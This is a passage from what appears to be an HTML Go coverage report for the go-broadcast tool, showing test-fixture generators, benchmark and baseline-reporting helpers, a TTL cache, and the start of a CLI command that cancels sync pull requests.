      variables:
        SERVICE_NAME: "service-%d"
        ENVIRONMENT: "production"`, i, i))
        }</span>

        <span class="cov8" title="1">return buf.Bytes()</span>
}

// GenerateJSONResponse creates test JSON response data
func GenerateJSONResponse(itemCount int) []byte <span class="cov8" title="1">{
        var buf bytes.Buffer
        buf.WriteString("[")

        for i := 0; i &lt; itemCount; i++ </span><span class="cov8" title="1">{
                if i &gt; 0 </span><span class="cov8" title="1">{
                        buf.WriteString(",")
                }</span>
                <span class="cov8" title="1">buf.WriteString(fmt.Sprintf(`{
  "name": "item-%d",
  "sha": "%s",
  "commit": {
    "sha": "%s",
    "message": "Commit message %d"
  },
  "protected": %t
}`, i, generateSHA(), generateSHA(), i, i%2 == 0))</span>
        }

        <span class="cov8" title="1">buf.WriteString("]")
        return buf.Bytes()</span>
}

// GenerateBase64Content creates base64 encoded test content
func GenerateBase64Content(size int) string <span class="cov8" title="1">{
        content := make([]byte, size)
        for i := range content </span><span class="cov8" title="1">{
                content[i] = byte(65 + (i % 26)) // A-Z pattern
        }</span>

        // Simple base64-like encoding for testing
        <span class="cov8" title="1">encoded := make([]byte, (size*4+2)/3)
        chars := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

        for i := 0; i &lt; len(encoded); i++ </span><span class="cov8" title="1">{
                encoded[i] = chars[i%len(chars)]
        }</span>

        <span class="cov8" title="1">return string(encoded)</span>
}

// GenerateLogEntries creates test log entries with various patterns
func GenerateLogEntries(count int, withTokens bool) []string <span class="cov8" title="1">{
        entries := make([]string, count)
        patterns := []string{
                "INFO Processing file: %s",
                "DEBUG Git command executed successfully",
                "ERROR Failed to clone repository: %s",
                "WARN Rate limit approaching: %d requests remaining",
                "INFO Successfully synchronized %d files",
        }

        for i := 0; i &lt; count; i++ </span><span class="cov8" title="1">{
                pattern := patterns[i%len(patterns)]

                var entry string
                switch i % len(patterns) </span>{
                case 0:<span class="cov8" title="1">
                        entry = fmt.Sprintf(pattern, fmt.Sprintf("file-%d.txt", i))</span>
                case 2:<span class="cov8" title="1">
                        entry = fmt.Sprintf(pattern, fmt.Sprintf("repo-%d", i))</span>
                case 3:<span class="cov8" title="1">
                        entry = fmt.Sprintf(pattern, 1000-i)</span>
                case 4:<span class="cov8" title="1">
                        entry = fmt.Sprintf(pattern, i*10)</span>
                default:<span class="cov8" title="1">
                        entry = pattern</span>
                }

                // Add tokens to some entries if requested
                <span class="cov8" title="1">if withTokens &amp;&amp; i%5 == 0 </span><span class="cov8" title="1">{
                        entry += " [token: ghp_" + generateToken() + "]"
                }</span>

                <span class="cov8" title="1">entries[i] = entry</span>
        }

        <span class="cov8" title="1">return entries</span>
}

// GenerateGitDiff creates a realistic git diff output
func GenerateGitDiff(fileCount, linesPerFile int) string <span class="cov8" title="1">{
        var buf strings.Builder

        for i := 0; i &lt; fileCount; i++ </span><span class="cov8" title="1">{
                filename := fmt.Sprintf("file%d.txt", i)
                buf.WriteString(fmt.Sprintf("diff --git a/%s b/%s\n", filename, filename))
                buf.WriteString(fmt.Sprintf("index %s..%s 100644\n", generateSHA()[:7], generateSHA()[:7]))
                buf.WriteString(fmt.Sprintf("--- a/%s\n", filename))
                buf.WriteString(fmt.Sprintf("+++ b/%s\n", filename))
                buf.WriteString(fmt.Sprintf("@@ -1,%d +1,%d @@\n", linesPerFile, linesPerFile+5))

                for j := 0; j &lt; linesPerFile; j++ </span><span class="cov8" title="1">{
                        if j%3 == 0 </span><span class="cov8" title="1">{
                                buf.WriteString(fmt.Sprintf("-old line %d\n", j))
                                buf.WriteString(fmt.Sprintf("+new line %d\n", j))
                        }</span> else<span class="cov8" title="1"> {
                                buf.WriteString(fmt.Sprintf(" unchanged line %d\n", j))
                        }</span>
                }
                <span class="cov8" title="1">buf.WriteString("\n")</span>
        }

        <span class="cov8" title="1">return buf.String()</span>
}

// GenerateRepositoryList creates test repository data
func GenerateRepositoryList(count int) []TestRepo <span class="cov8" title="1">{
        repos := make([]TestRepo, count)

        for i := 0; i &lt; count; i++ </span><span class="cov8" title="1">{
                fileCount := 3 + (i % 10) // 3-12 files per repo
                files := make([]TestFile, fileCount)

                for j := 0; j &lt; fileCount; j++ </span><span class="cov8" title="1">{
                        files[j] = TestFile{
                                Path:    fmt.Sprintf("file%d.txt", j),
                                Content: fmt.Sprintf("Content for file %d in repo %d\n", j, i),
                                Size:    50 + (j * 10),
                        }
                }</span>

                <span class="cov8" title="1">repos[i] = TestRepo{
                        Name:  fmt.Sprintf("org/repo-%d", i),
                        Files: files,
                        Size:  getSizeCategory(len(files)),
                }</span>
        }

        <span class="cov8" title="1">return repos</span>
}

// Helper functions

func generateSHA() string <span class="cov8" title="1">{
        const chars = "abcdef0123456789"
        b := make([]byte, 40)
        for i := range b </span><span class="cov8" title="1">{
                b[i] = chars[rand.Intn(len(chars))] //nolint:gosec // Using weak random for test fixtures is acceptable
        }</span>
        <span class="cov8" title="1">return string(b)</span>
}

func generateToken() string <span class="cov8" title="1">{
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        b := make([]byte, 20)
        for i := range b </span><span class="cov8" title="1">{
                b[i] = chars[rand.Intn(len(chars))] //nolint:gosec // Using weak random for test fixtures is acceptable
        }</span>
        <span class="cov8" title="1">return string(b)</span>
}

func getSizeCategory(fileCount int) string <span class="cov8" title="1">{
        switch </span>{
        case fileCount &lt;= 5:<span class="cov8" title="1">
                return "small"</span>
        case fileCount &lt;= 15:<span class="cov8" title="1">
                return "medium"</span>
        case fileCount &lt;= 50:<span class="cov0" title="0">
                return "large"</span>
        default:<span class="cov0" title="0">
                return "xlarge"</span>
        }
}

// As of Go 1.20, global rand is automatically seeded
// No initialization required for random number generation in tests
</pre>

		<pre class="file" id="file6" style="display: none">package benchmark

import (
        "fmt"
        "os"
        "path/filepath"
        "runtime"
        "testing"
        "time"
)

// Result captures comprehensive performance metrics
type Result struct {
        Name        string
        Operations  int64
        NsPerOp     int64
        AllocsPerOp int64
        BytesPerOp  int64
        MemoryUsed  int64
        StartTime   time.Time
        EndTime     time.Time
}

// MemoryStats captures memory usage before and after operation
type MemoryStats struct {
        Before runtime.MemStats
        After  runtime.MemStats
}

// CaptureMemoryStats runs a function and captures memory statistics
func CaptureMemoryStats(fn func()) MemoryStats <span class="cov8" title="1">{
        var stats MemoryStats
        runtime.GC()
        runtime.ReadMemStats(&amp;stats.Before)

        fn()

        runtime.GC()
        runtime.ReadMemStats(&amp;stats.After)
        return stats
}</span>

// ReportResults generates a formatted benchmark report
func ReportResults(b *testing.B, results []Result) <span class="cov8" title="1">{
        b.Helper()
        for _, r := range results </span><span class="cov8" title="1">{
                b.Logf("Benchmark: %s", r.Name)
                b.Logf("  Operations: %d", r.Operations)
                b.Logf("  ns/op: %d", r.NsPerOp)
                b.Logf("  allocs/op: %d", r.AllocsPerOp)
                b.Logf("  bytes/op: %d", r.BytesPerOp)
        }</span>
}

// GenerateTestData creates test data of various sizes
func GenerateTestData(size string) []byte <span class="cov8" title="1">{
        sizes := map[string]int{
                "small":  1024,             // 1KB
                "medium": 1024 * 100,       // 100KB
                "large":  1024 * 1024,      // 1MB
                "xlarge": 1024 * 1024 * 10, // 10MB
        }

        if bytes, ok := sizes[size]; ok </span><span class="cov8" title="1">{
                data := make([]byte, bytes)
                for i := range data </span><span class="cov8" title="1">{
                        data[i] = byte(i % 256)
                }</span>
                <span class="cov8" title="1">return data</span>
        }
        <span class="cov8" title="1">return nil</span>
}

// MeasureOperation measures an operation and returns timing metrics
func MeasureOperation(name string, fn func()) Result <span class="cov8" title="1">{
        result := Result{
                Name:      name,
                StartTime: time.Now(),
        }

        // Capture memory stats
        var memBefore, memAfter runtime.MemStats
        runtime.GC()
        runtime.ReadMemStats(&amp;memBefore)

        // Run the operation
        fn()

        runtime.GC()
        runtime.ReadMemStats(&amp;memAfter)

        result.EndTime = time.Now()
        result.Operations = 1
        result.NsPerOp = result.EndTime.Sub(result.StartTime).Nanoseconds()
        result.AllocsPerOp = int64(memAfter.Mallocs - memBefore.Mallocs)      //nolint:gosec // Memory stats unlikely to overflow in tests
        result.BytesPerOp = int64(memAfter.TotalAlloc - memBefore.TotalAlloc) //nolint:gosec // Memory stats unlikely to overflow in tests
        result.MemoryUsed = int64(memAfter.Alloc)                             //nolint:gosec // Memory stats unlikely to overflow in tests

        return result
}</span>

// RunWithMemoryTracking executes a benchmark with detailed memory tracking
func RunWithMemoryTracking(b *testing.B, _ string, fn func()) <span class="cov8" title="1">{
        b.Helper()

        var memStats runtime.MemStats
        runtime.ReadMemStats(&amp;memStats)
        allocsBefore := memStats.Mallocs
        bytesBefore := memStats.TotalAlloc

        b.ResetTimer()
        for i := 0; i &lt; b.N; i++ </span><span class="cov8" title="1">{
                fn()
        }</span>
        <span class="cov8" title="1">b.StopTimer()

        runtime.ReadMemStats(&amp;memStats)
        allocsAfter := memStats.Mallocs
        bytesAfter := memStats.TotalAlloc

        b.ReportAllocs()
        b.ReportMetric(float64(allocsAfter-allocsBefore)/float64(b.N), "allocs/op")
        b.ReportMetric(float64(bytesAfter-bytesBefore)/float64(b.N), "bytes/op")</span>
}

// CreateTempRepo creates a temporary git repository for testing
func CreateTempRepo(b *testing.B) string <span class="cov8" title="1">{
        b.Helper()
        return b.TempDir()
}</span>

// Size represents a size configuration for benchmarks
type Size struct {
        Name      string
        FileCount int
        FileSize  int
}

// Sizes returns standard size configurations for benchmarks
func Sizes() []struct {
        Name string
        Size string
} <span class="cov8" title="1">{
        return []struct {
                Name string
                Size string
        }{
                {"Small", "small"},
                {"Medium", "medium"},
                {"Large", "large"},
                {"XLarge", "xlarge"},
        }
}</span>

// StandardSizes returns consistent size configurations for benchmarks
func StandardSizes() []Size <span class="cov8" title="1">{
        return []Size{
                {Name: "Small", FileCount: 10, FileSize: 1024},
                {Name: "Medium", FileCount: 100, FileSize: 10240},
                {Name: "Large", FileCount: 1000, FileSize: 102400},
        }
}</span>

// SetupBenchmarkFiles creates files for benchmark testing
func SetupBenchmarkFiles(b *testing.B, dir string, count int) []string <span class="cov8" title="1">{
        b.Helper()

        files := make([]string, count)
        for i := 0; i &lt; count; i++ </span><span class="cov8" title="1">{
                fileName := fmt.Sprintf("bench_file_%d.txt", i)
                filePath := filepath.Join(dir, fileName)
                content := fmt.Sprintf("Benchmark test content %d", i)

                err := os.WriteFile(filePath, []byte(content), 0o600)
                if err != nil </span><span class="cov0" title="0">{
                        b.Fatalf("failed to create benchmark file %s: %v", filePath, err)
                }</span>
                <span class="cov8" title="1">files[i] = filePath</span>
        }
        <span class="cov8" title="1">return files</span>
}

// WithMemoryTracking runs benchmark with memory allocation tracking
func WithMemoryTracking(b *testing.B, fn func()) <span class="cov8" title="1">{
        b.Helper()
        b.ReportAllocs()
        b.ResetTimer()

        for i := 0; i &lt; b.N; i++ </span><span class="cov8" title="1">{
                fn()
        }</span>

        <span class="cov8" title="1">b.StopTimer()</span>
}

// SetupBenchmarkRepo creates a temporary repository for benchmark testing
func SetupBenchmarkRepo(b *testing.B) string <span class="cov8" title="1">{
        b.Helper()
        return b.TempDir()
}</span>
</pre>

		<pre class="file" id="file7" style="display: none">package benchmark

import (
        "fmt"
        "os"
        "runtime"
        "sort"
        "strings"
        "time"

        "github.com/mrz1836/go-broadcast/internal/jsonutil"
)

// BaselineReport represents a complete performance baseline
type BaselineReport struct {
        Timestamp  time.Time          `json:"timestamp"`
        GoVersion  string             `json:"go_version"`
        GOOS       string             `json:"goos"`
        GOARCH     string             `json:"goarch"`
        Benchmarks map[string]Metrics `json:"benchmarks"`
}

// Metrics contains detailed performance metrics
type Metrics struct {
        Name        string  `json:"name"`
        NsPerOp     int64   `json:"ns_per_op"`
        AllocsPerOp int64   `json:"allocs_per_op"`
        BytesPerOp  int64   `json:"bytes_per_op"`
        MBPerSec    float64 `json:"mb_per_sec,omitempty"`
        Operations  int64   `json:"operations,omitempty"`
}

// ComparisonReport contains performance comparison data
type ComparisonReport struct {
        BaselineReport BaselineReport     `json:"baseline"`
        CurrentReport  BaselineReport     `json:"current"`
        Improvements   map[string]float64 `json:"improvements"`
        Regressions    map[string]float64 `json:"regressions"`
        Summary        ComparisonSummary  `json:"summary"`
}

// ComparisonSummary provides high-level comparison metrics
type ComparisonSummary struct {
        TotalBenchmarks     int     `json:"total_benchmarks"`
        Improved            int     `json:"improved"`
        Regressed           int     `json:"regressed"`
        Unchanged           int     `json:"unchanged"`
        AvgSpeedImprovement float64 `json:"avg_speed_improvement"`
        AvgMemoryReduction  float64 `json:"avg_memory_reduction"`
}

// SaveBaseline saves benchmark results to a JSON file
func SaveBaseline(filename string, report BaselineReport) error <span class="cov8" title="1">{
        // Use PrettyPrint to get formatted JSON
        formatted, err := jsonutil.PrettyPrint(report)
        if err != nil </span><span class="cov0" title="0">{
                return fmt.Errorf("failed to marshal baseline: %w", err)
        }</span>
        <span class="cov8" title="1">data := []byte(formatted)

        if err := os.WriteFile(filename, data, 0o600); err != nil </span><span class="cov0" title="0">{
                return fmt.Errorf("failed to write baseline file: %w", err)
        }</span>

        <span class="cov8" title="1">return nil</span>
}

// LoadBaseline loads benchmark results from a JSON file
func LoadBaseline(filename string) (*BaselineReport, error) <span class="cov8" title="1">{
        data, err := os.ReadFile(filename) //nolint:gosec // Reading benchmark baseline file
        if err != nil </span><span class="cov8" title="1">{
                return nil, fmt.Errorf("failed to read baseline file: %w", err)
        }</span>

        <span class="cov8" title="1">report, err := jsonutil.UnmarshalJSON[BaselineReport](data)
        if err != nil </span><span class="cov8" title="1">{
                return nil, fmt.Errorf("failed to unmarshal baseline: %w", err)
        }</span>

        <span class="cov8" title="1">return &amp;report, nil</span>
}

// CreateBaselineReport creates a new baseline report with system information
func CreateBaselineReport(benchmarks map[string]Metrics) BaselineReport <span class="cov8" title="1">{
        return BaselineReport{
                Timestamp:  time.Now(),
                GoVersion:  runtime.Version(),
                GOOS:       runtime.GOOS,
                GOARCH:     runtime.GOARCH,
                Benchmarks: benchmarks,
        }
}</span>

// CompareWithBaseline compares current results with baseline
func CompareWithBaseline(current, baseline BaselineReport) ComparisonReport <span class="cov8" title="1">{
        improvements := make(map[string]float64)
        regressions := make(map[string]float64)

        var totalSpeedChange, totalMemoryChange float64
        var changedCount int

        for name, currentMetric := range current.Benchmarks </span><span class="cov8" title="1">{
                baselineMetric, exists := baseline.Benchmarks[name]
                if !exists </span><span class="cov0" title="0">{
                        continue</span>
                }

                // Calculate speed improvement (lower ns/op is better)
                <span class="cov8" title="1">speedChange := calculateImprovement(float64(baselineMetric.NsPerOp), float64(currentMetric.NsPerOp))

                // Calculate memory improvement (fewer bytes/op is better)
                memoryChange := calculateImprovement(float64(baselineMetric.BytesPerOp), float64(currentMetric.BytesPerOp))

                if speedChange &gt; 0 </span><span class="cov8" title="1">{
                        improvements[name+"_speed"] = speedChange
                }</span> else<span class="cov8" title="1"> if speedChange &lt; 0 </span><span class="cov8" title="1">{
                        regressions[name+"_speed"] = -speedChange
                }</span>

                <span class="cov8" title="1">if memoryChange &gt; 0 </span><span class="cov8" title="1">{
                        improvements[name+"_memory"] = memoryChange
                }</span> else<span class="cov8" title="1"> if memoryChange &lt; 0 </span><span class="cov8" title="1">{
                        regressions[name+"_memory"] = -memoryChange
                }</span>

                <span class="cov8" title="1">totalSpeedChange += speedChange
                totalMemoryChange += memoryChange
                changedCount++</span>
        }

        <span class="cov8" title="1">summary := ComparisonSummary{
                TotalBenchmarks:     len(current.Benchmarks),
                Improved:            len(improvements),
                Regressed:           len(regressions),
                Unchanged:           len(current.Benchmarks) - len(improvements) - len(regressions),
                AvgSpeedImprovement: totalSpeedChange / float64(changedCount),
                AvgMemoryReduction:  totalMemoryChange / float64(changedCount),
        }

        return ComparisonReport{
                BaselineReport: baseline,
                CurrentReport:  current,
                Improvements:   improvements,
                Regressions:    regressions,
                Summary:        summary,
        }</span>
}

// GenerateTextReport creates a human-readable performance report
func GenerateTextReport(comparison ComparisonReport) string <span class="cov8" title="1">{
        var report strings.Builder

        report.WriteString("Performance Comparison Report\n")
        report.WriteString("=============================\n\n")

        report.WriteString(fmt.Sprintf("Baseline: %s (%s %s)\n",
                comparison.BaselineReport.Timestamp.Format("2006-01-02 15:04:05"),
                comparison.BaselineReport.GOOS, comparison.BaselineReport.GOARCH))
        report.WriteString(fmt.Sprintf("Current:  %s (%s %s)\n\n",
                comparison.CurrentReport.Timestamp.Format("2006-01-02 15:04:05"),
                comparison.CurrentReport.GOOS, comparison.CurrentReport.GOARCH))

        // Summary
        summary := comparison.Summary
        report.WriteString("Summary:\n")
        report.WriteString(fmt.Sprintf("  Total Benchmarks: %d\n", summary.TotalBenchmarks))
        report.WriteString(fmt.Sprintf("  Improved:         %d\n", summary.Improved))
        report.WriteString(fmt.Sprintf("  Regressed:        %d\n", summary.Regressed))
        report.WriteString(fmt.Sprintf("  Unchanged:        %d\n", summary.Unchanged))
        report.WriteString(fmt.Sprintf("  Avg Speed Improvement: %.1f%%\n", summary.AvgSpeedImprovement))
        report.WriteString(fmt.Sprintf("  Avg Memory Reduction:  %.1f%%\n\n", summary.AvgMemoryReduction))

        // Improvements
        if len(comparison.Improvements) &gt; 0 </span><span class="cov8" title="1">{
                report.WriteString("Improvements:\n")
                improvements := sortMetrics(comparison.Improvements)
                for _, metric := range improvements </span><span class="cov8" title="1">{
                        report.WriteString(fmt.Sprintf("  %s: %.1f%% %s\n",
                                metric.Name, metric.Value, getImprovementEmoji(metric.Value)))
                }</span>
                <span class="cov8" title="1">report.WriteString("\n")</span>
        }

        // Regressions
        <span class="cov8" title="1">if len(comparison.Regressions) &gt; 0 </span><span class="cov8" title="1">{
                report.WriteString("Regressions:\n")
                regressions := sortMetrics(comparison.Regressions)
                for _, metric := range regressions </span><span class="cov8" title="1">{
                        report.WriteString(fmt.Sprintf("  %s: %.1f%% ‚ö†Ô∏è\n", metric.Name, metric.Value))
                }</span>
                <span class="cov8" title="1">report.WriteString("\n")</span>
        }

        // Detailed comparison
        <span class="cov8" title="1">report.WriteString("Detailed Comparison:\n")
        for name, currentMetric := range comparison.CurrentReport.Benchmarks </span><span class="cov8" title="1">{
                baselineMetric, exists := comparison.BaselineReport.Benchmarks[name]
                if !exists </span><span class="cov0" title="0">{
                        continue</span>
                }

                <span class="cov8" title="1">report.WriteString(fmt.Sprintf("\n%s:\n", name))
                report.WriteString(fmt.Sprintf("  Speed:  %d ns/op ‚Üí %d ns/op (%.1f%%)\n",
                        baselineMetric.NsPerOp, currentMetric.NsPerOp,
                        calculateImprovement(float64(baselineMetric.NsPerOp), float64(currentMetric.NsPerOp))))
                report.WriteString(fmt.Sprintf("  Memory: %d B/op ‚Üí %d B/op (%.1f%%)\n",
                        baselineMetric.BytesPerOp, currentMetric.BytesPerOp,
                        calculateImprovement(float64(baselineMetric.BytesPerOp), float64(currentMetric.BytesPerOp))))
                report.WriteString(fmt.Sprintf("  Allocs: %d allocs/op ‚Üí %d allocs/op (%.1f%%)\n",
                        baselineMetric.AllocsPerOp, currentMetric.AllocsPerOp,
                        calculateImprovement(float64(baselineMetric.AllocsPerOp), float64(currentMetric.AllocsPerOp))))</span>
        }

        <span class="cov8" title="1">return report.String()</span>
}

// Helper functions

type metricPair struct {
        Name  string
        Value float64
}

func sortMetrics(metrics map[string]float64) []metricPair <span class="cov8" title="1">{
        pairs := make([]metricPair, 0, len(metrics))
        for name, value := range metrics </span><span class="cov8" title="1">{
                pairs = append(pairs, metricPair{Name: name, Value: value})
        }</span>

        <span class="cov8" title="1">sort.Slice(pairs, func(i, j int) bool </span><span class="cov8" title="1">{
                return pairs[i].Value &gt; pairs[j].Value
        }</span>)

        <span class="cov8" title="1">return pairs</span>
}

func calculateImprovement(baseline, current float64) float64 <span class="cov8" title="1">{
        if baseline == 0 </span><span class="cov8" title="1">{
                return 0
        }</span>
        <span class="cov8" title="1">return ((baseline - current) / baseline) * 100</span>
}

func getImprovementEmoji(improvement float64) string <span class="cov8" title="1">{
        switch </span>{
        case improvement &gt;= 50:<span class="cov8" title="1">
                return "üöÄ"</span>
        case improvement &gt;= 25:<span class="cov8" title="1">
                return "‚ö°"</span>
        case improvement &gt;= 10:<span class="cov8" title="1">
                return "‚úÖ"</span>
        case improvement &gt;= 5:<span class="cov8" title="1">
                return "üëç"</span>
        default:<span class="cov8" title="1">
                return "üìà"</span>
        }
}
</pre>

		<pre class="file" id="file8" style="display: none">package cache

import (
        "sync"
        "sync/atomic"
        "time"
)

// Entry represents a cached value
type Entry struct {
        Value     interface{}
        ExpiresAt time.Time
}

// TTLCache provides time-based caching
type TTLCache struct {
        mu      sync.RWMutex
        items   map[string]Entry
        ttl     time.Duration
        maxSize int

        // Metrics
        hits   atomic.Int64
        misses atomic.Int64

        // Cleanup
        stopCleanup chan struct{}
        once        sync.Once
}

// NewTTLCache creates a new TTL cache
func NewTTLCache(ttl time.Duration, maxSize int) *TTLCache <span class="cov8" title="1">{
        cache := &amp;TTLCache{
                items:       make(map[string]Entry),
                ttl:         ttl,
                maxSize:     maxSize,
                stopCleanup: make(chan struct{}),
        }

        // Start cleanup goroutine
        go cache.cleanup()

        return cache
}</span>

// Get retrieves a value from cache
func (c *TTLCache) Get(key string) (interface{}, bool) <span class="cov8" title="1">{
        c.mu.RLock()
        defer c.mu.RUnlock()

        entry, exists := c.items[key]
        if !exists </span><span class="cov8" title="1">{
                c.misses.Add(1)
                return nil, false
        }</span>

        <span class="cov8" title="1">if time.Now().After(entry.ExpiresAt) </span><span class="cov0" title="0">{
                c.misses.Add(1)
                return nil, false
        }</span>

        <span class="cov8" title="1">c.hits.Add(1)
        return entry.Value, true</span>
}

// Set stores a value in cache
func (c *TTLCache) Set(key string, value interface{}) <span class="cov8" title="1">{
        c.mu.Lock()
        defer c.mu.Unlock()

        // Evict oldest entry if at capacity
        if len(c.items) &gt;= c.maxSize </span><span class="cov8" title="1">{
                c.evictOldest()
        }</span>

        <span class="cov8" title="1">c.items[key] = Entry{
                Value:     value,
                ExpiresAt: time.Now().Add(c.ttl),
        }</span>
}

// GetOrLoad retrieves from cache or loads using the provided function
func (c *TTLCache) GetOrLoad(key string, loader func() (interface{}, error)) (interface{}, error) <span class="cov8" title="1">{
        if val, ok := c.Get(key); ok </span><span class="cov8" title="1">{
                return val, nil
        }</span>

        <span class="cov8" title="1">val, err := loader()
        if err != nil </span><span class="cov8" title="1">{
                return nil, err
        }</span>

        <span class="cov8" title="1">c.Set(key, val)
        return val, nil</span>
}

// Delete removes a key from the cache
func (c *TTLCache) Delete(key string) <span class="cov8" title="1">{
        c.mu.Lock()
        defer c.mu.Unlock()

        delete(c.items, key)
}</span>

// Clear removes all entries from the cache
func (c *TTLCache) Clear() <span class="cov8" title="1">{
        c.mu.Lock()
        defer c.mu.Unlock()

        c.items = make(map[string]Entry)
        c.hits.Store(0)
        c.misses.Store(0)
}</span>

// Stats returns cache statistics
func (c *TTLCache) Stats() (hits, misses int64, size int, hitRate float64) <span class="cov8" title="1">{
        c.mu.RLock()
        size = len(c.items)
        c.mu.RUnlock()

        hits = c.hits.Load()
        misses = c.misses.Load()

        total := hits + misses
        if total &gt; 0 </span><span class="cov8" title="1">{
                hitRate = float64(hits) / float64(total)
        }</span>

        <span class="cov8" title="1">return hits, misses, size, hitRate</span>
}

// Size returns current cache size
func (c *TTLCache) Size() int <span class="cov8" title="1">{
        c.mu.RLock()
        defer c.mu.RUnlock()
        return len(c.items)
}</span>

// Close stops the cleanup goroutine
func (c *TTLCache) Close() <span class="cov8" title="1">{
        c.once.Do(func() </span><span class="cov8" title="1">{
                close(c.stopCleanup)
        }</span>)
}

// cleanup periodically removes expired entries
func (c *TTLCache) cleanup() <span class="cov8" title="1">{
        ticker := time.NewTicker(c.ttl / 2)
        defer ticker.Stop()

        for </span><span class="cov8" title="1">{
                select </span>{
                case &lt;-ticker.C:<span class="cov8" title="1">
                        c.mu.Lock()
                        now := time.Now()
                        for key, entry := range c.items </span><span class="cov8" title="1">{
                                if now.After(entry.ExpiresAt) </span><span class="cov8" title="1">{
                                        delete(c.items, key)
                                }</span>
                        }
                        <span class="cov8" title="1">c.mu.Unlock()</span>
                case &lt;-c.stopCleanup:<span class="cov8" title="1">
                        return</span>
                }
        }
}

// evictOldest removes the oldest entry
func (c *TTLCache) evictOldest() <span class="cov8" title="1">{
        var oldestKey string
        var oldestTime time.Time

        for key, entry := range c.items </span><span class="cov8" title="1">{
                if oldestTime.IsZero() || entry.ExpiresAt.Before(oldestTime) </span><span class="cov8" title="1">{
                        oldestKey = key
                        oldestTime = entry.ExpiresAt
                }</span>
        }

        <span class="cov8" title="1">if oldestKey != "" </span><span class="cov8" title="1">{
                delete(c.items, oldestKey)
        }</span>
}
</pre>

		<pre class="file" id="file9" style="display: none">package cli

import (
        "context"
        "encoding/json"
        "errors"
        "fmt"
        "sort"
        "time"

        "github.com/sirupsen/logrus"
        "github.com/spf13/cobra"

        "github.com/mrz1836/go-broadcast/internal/config"
        "github.com/mrz1836/go-broadcast/internal/gh"
        "github.com/mrz1836/go-broadcast/internal/logging"
        "github.com/mrz1836/go-broadcast/internal/output"
        "github.com/mrz1836/go-broadcast/internal/state"
)

// ErrTargetNotFound is returned when a target repository is not found in the configuration
var ErrTargetNotFound = errors.New("target repository not found in configuration")

//nolint:gochecknoglobals // Package-level variables for CLI flags
var (
        cancelKeepBranches bool
        cancelComment      string
)

// initCancel initializes cancel command flags
func initCancel() <span class="cov8" title="1">{
        cancelCmd.Flags().BoolVar(&amp;cancelKeepBranches, "keep-branches", false, "Close PRs but keep sync branches")
        cancelCmd.Flags().StringVar(&amp;cancelComment, "comment", "", "Custom comment to add when closing PRs")
}</span>

//nolint:gochecknoglobals // Cobra commands are designed to be global variables
var cancelCmd = &amp;cobra.Command{
        Use:   "cancel [targets...]",
        Short: "Cancel active sync operations",
        Long: `Cancel active sync operations by closing open pull requests and optionally deleting sync branches.

This command finds all open sync pull requests for the specified targets (or all targets if none specified)
and closes them with a descriptive comment. By default, it also deletes the associated sync branches
to clean up the repositories.

Use this when you need to cancel a sync operation due to issues and want to re-sync later with
updated files or configuration.`,
        Example: `  # Cancel all active syncs
  go-broadcast cancel --config sync.yaml

  # Cancel syncs for specific repositories
  go-broadcast cancel org/repo1 org/repo2

  # Preview what would be canceled (dry run)
  go-broadcast cancel --dry-run --config sync.yaml

  # Close PRs but keep sync branches
  go-broadcast cancel --keep-branches --config sync.yaml

  # Add custom comment when closing PRs
  go-broadcast cancel --comment "Canceling due to configuration update" --config sync.yaml`,
        Aliases: []string{"c"},
        RunE:    runCancel,
}

// CancelResult represents the result of a cancel operation
type CancelResult struct {
        Repository    string `json:"repository"`
        PRNumber      *int   `json:"pr_number,omitempty"`
        PRClosed      bool   `json:"pr_closed"`
        BranchName    string `json:"branch_name,omitempty"`
        BranchDeleted bool   `json:"branch_deleted"`
        Error         string `json:"error,omitempty"`
}

// CancelSummary represents the overall cancel operation results
type CancelSummary struct {
        TotalTargets    int            `json:"total_targets"`
        PRsClosed       int            `json:"prs_closed"`
        BranchesDeleted int            `json:"branches_deleted"`
        Errors          int            `json:"errors"`
        Results         []CancelResult `json:"results"`
        DryRun          bool           `json:"dry_run"`
}

func runCancel(cmd *cobra.Command, args []string) error <span class="cov8" title="1">{
        ctx := cmd.Context()
        log := logrus.WithField("command", "cancel")

        // Load configuration
        cfg, err := loadConfig()
        if err != nil </span><span class="cov8" title="1">{
                return fmt.Errorf("failed to load configuration: %w", err)
        }</span>

        // Filter targets if specified
        <span class="cov8" title="1">targetRepos := args
        if len(targetRepos) &gt; 0 </span><span class="cov8" title="1">{
                log.WithField("targets", targetRepos).Info("Canceling syncs for specific targets")
        }</span> else<span class="cov8" title="1"> {
                log.Info("Canceling syncs for all configured targets")
        }</span>

        // Perform cancel operation
        <span class="cov8" title="1">summary, err := performCancel(ctx, cfg, targetRepos)
        if err != nil </span><span class="cov8" title="1">{
                return fmt.Errorf("cancel operation failed: %w", err)
        }</span>

        // Output results
        <span class="cov0" title="0">if globalFlags.DryRun </span><span class="cov0" title="0">{
                return outputCancelPreview(summary)
        }</span>

        <span class="cov0" title="0">return outputCancelResults(summary)</span>
}

func performCancel(ctx context.Context, cfg *config.Config, targetRepos []string) (*CancelSummary, error) <span class="cov8" title="1">{
        if cfg == nil </span><span class="cov8" title="1">{
                panic("config cannot be nil")</span>
        }

        // Create logger for GitHub operations
        <span class="cov8" title="1">logger := logrus.New()
        logger.SetLevel(logrus.InfoLevel)

        // Create logging config with minimal debug settings
        logConfig := &amp;logging.LogConfig{
                Debug: logging.DebugFlags{
                        State: false,
                        API:   false,
                },
                Verbose: 0,
        }

        // Initialize GitHub client
        ghClient, err := gh.NewClient(ctx, logger, logConfig)
        if err != nil </span><span class="cov0" title="0">{
                switch </span>{
                case errors.Is(err, gh.ErrGHNotFound):<span class="cov0" title="0">
                        return nil, fmt.Errorf("%w: Please install GitHub CLI: https://cli.github.com/", gh.ErrGHNotFound)</span>
                case errors.Is(err, gh.ErrNotAuthenticated):<span class="cov0" title="0">
                        return nil, fmt.Errorf("%w: Please run: gh auth login", gh.ErrNotAuthenticated)</span>
                default:<span class="cov0" title="0">
                        return nil, fmt.Errorf("failed to initialize GitHub client: %w", err)</span>
                }
        }

        // Initialize state discoverer
        <span class="cov8" title="1">discoverer := state.NewDiscoverer(ghClient, logger, logConfig)

        // Discover current state
        currentState, err := discoverer.DiscoverState(ctx, cfg)
        if err != nil </span><span class="cov8" title="1">{
                return nil, fmt.Errorf("failed to discover sync state: %w", err)
        }</span>

        // Filter targets if specified
        <span class="cov0" title="0">filteredTargets, err := filterTargets(currentState, targetRepos)
